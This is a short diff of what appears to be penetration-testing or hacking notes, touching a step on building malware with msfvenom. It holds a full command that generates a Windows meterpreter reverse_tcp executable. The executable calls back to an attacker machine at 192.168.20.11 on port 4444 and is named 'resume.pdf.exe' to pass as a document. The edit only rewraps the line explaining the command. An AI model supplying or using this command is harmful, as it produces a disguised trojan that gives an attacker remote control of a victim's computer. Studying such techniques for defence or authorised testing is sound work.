@@ -120,7 +120,9 @@
  - To get a list of payloads - msfvenom -l payloads
 
  - Enter msfvenom -p (paste your payload) windows/x64/meterpreter/reverse_tcp lhost=ip of attack machine 192.168.20.11 lport=4444 -f exe -o resume.pdf.exe
-   [what this command does :- will generate our malware using meterpreter reverse tcp payload instructed to connect back to the machine based on lhost and lport file format will be an exe and name being resume.exe ]
+
+   [what this command does :- will generate our malware using meterpreter reverse tcp payload instructed to connect back to the machine based on lhost and lport file format will be an exe and name 
+   being resume.exe ]
  
  - Verify with ls
 ---
